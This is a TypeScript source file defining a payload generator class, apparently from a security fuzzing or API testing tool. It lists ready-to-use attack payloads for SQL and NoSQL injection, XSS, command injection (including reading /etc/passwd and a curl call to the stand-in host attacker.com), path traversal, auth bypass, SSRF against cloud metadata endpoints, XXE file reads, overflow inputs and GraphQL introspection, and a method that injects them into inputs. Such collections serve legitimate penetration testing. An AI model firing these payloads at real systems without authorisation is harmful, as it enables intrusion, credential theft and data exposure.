export class PayloadGenerator {
  // SQL Injection payloads
  private sqlPayloads = [
    "' OR '1'='1",
    "' OR 1=1--",
    "admin'--",
    "' UNION SELECT NULL--",
    "1' AND '1'='1",
    "'; DROP TABLE users--",
    "' OR 'x'='x",
    "1 AND 1=1",
    "1' ORDER BY 1--",
    "' UNION ALL SELECT NULL,NULL--"
  ];

  // NoSQL Injection payloads
  private nosqlPayloads = [
    '{"$gt": ""}',
    '{"$ne": null}',
    '{"$where": "1==1"}',
    '{"$regex": ".*"}',
    '{"$exists": true}',
    '{"username": {"$ne": null}, "password": {"$ne": null}}'
  ];

  // XSS payloads
  private xssPayloads = [
    '<script>alert(1)</script>',
    '<img src=x onerror=alert(1)>',
    '<svg onload=alert(1)>',
    'javascript:alert(1)',
    '<iframe src="javascript:alert(1)">',
    '<body onload=alert(1)>',
    '<input onfocus=alert(1) autofocus>',
    '"><script>alert(1)</script>',
    "'><script>alert(1)</script>",
    '<scr<script>ipt>alert(1)</scr</script>ipt>'
  ];

  // Command Injection payloads
  private commandPayloads = [
    '; ls -la',
    '| whoami',
    '`id`',
    '$(id)',
    '; cat /etc/passwd',
    '& dir',
    '| type C:\\Windows\\System32\\drivers\\etc\\hosts',
    '; ping -c 4 127.0.0.1',
    '`curl http://attacker.com`'
  ];

  // Path Traversal payloads
  private pathTraversalPayloads = [
    '../../../etc/passwd',
    '..\\..\\..\\windows\\system32\\config\\sam',
    '....//....//....//etc/passwd',
    '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
    '..%252f..%252f..%252fetc%252fpasswd',
    '/etc/passwd%00.jpg'
  ];

  // Auth Bypass payloads
  private authBypassPayloads = [
    '',
    ' ',
    'null',
    'undefined',
    '{}',
    '[]',
    '{"admin": true}',
    '{"role": "admin"}',
    'Bearer null',
    'Bearer undefined',
    'Basic YWRtaW46YWRtaW4=', // admin:admin
    '../admin',
    '/admin'
  ];

  // SSRF payloads
  private ssrfPayloads = [
    'http://localhost',
    'http://127.0.0.1',
    'http://0.0.0.0',
    'http://169.254.169.254/latest/meta-data/',
    'http://metadata.google.internal/computeMetadata/v1/',
    'http://[::1]',
    'http://localhost:22',
    'file:///etc/passwd'
  ];

  // XXE payloads
  private xxePayloads = [
    '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
    '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///c:/windows/win.ini">]><root>&test;</root>'
  ];

  // Integer overflow payloads
  private integerPayloads = [
    -1,
    0,
    2147483647,
    -2147483648,
    9999999999,
    -9999999999
  ];

  // Buffer overflow payloads
  private bufferPayloads = [
    'A'.repeat(1000),
    'A'.repeat(10000),
    'A'.repeat(100000)
  ];

  getAll(): Record<string, any[]> {
    return {
      sql: this.sqlPayloads,
      nosql: this.nosqlPayloads,
      xss: this.xssPayloads,
      command: this.commandPayloads,
      pathTraversal: this.pathTraversalPayloads,
      authBypass: this.authBypassPayloads,
      ssrf: this.ssrfPayloads,
      xxe: this.xxePayloads,
      integer: this.integerPayloads,
      buffer: this.bufferPayloads
    };
  }

  getByType(type: string): any[] {
    const payloads = this.getAll();
    return payloads[type] || [];
  }

  mutateValue(value: any): any[] {
    const mutations: any[] = [];
    
    if (typeof value === 'string') {
      mutations.push(
        ...this.sqlPayloads,
        ...this.xssPayloads,
        ...this.commandPayloads,
        ...this.pathTraversalPayloads,
        ...this.bufferPayloads
      );
    } else if (typeof value === 'number') {
      mutations.push(...this.integerPayloads);
    } else if (typeof value === 'object') {
      mutations.push(...this.nosqlPayloads.map(p => {
        try { return JSON.parse(p); } catch { return p; }
      }));
    }

    return mutations;
  }

  generateGraphQLPayloads(): string[] {
    return [
      '{ __schema { types { name } } }',
      '{ __type(name: "Query") { fields { name } } }',
      'query IntrospectionQuery { __schema { queryType { name } mutationType { name } subscriptionType { name } types { ...FullType } directives { name description locations args { ...InputValue } } } } fragment FullType on __Type { kind name description fields(includeDeprecated: true) { name description args { ...InputValue } type { ...TypeRef } isDeprecated deprecationReason } inputFields { ...InputValue } interfaces { ...TypeRef } enumValues(includeDeprecated: true) { name description isDeprecated deprecationReason } possibleTypes { ...TypeRef } } fragment InputValue on __InputValue { name description type { ...TypeRef } defaultValue } fragment TypeRef on __Type { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name } } } } } } } }',
      '{ __typename }',
      'query { __schema { mutationType { fields { name } } } }'
    ];
  }
}
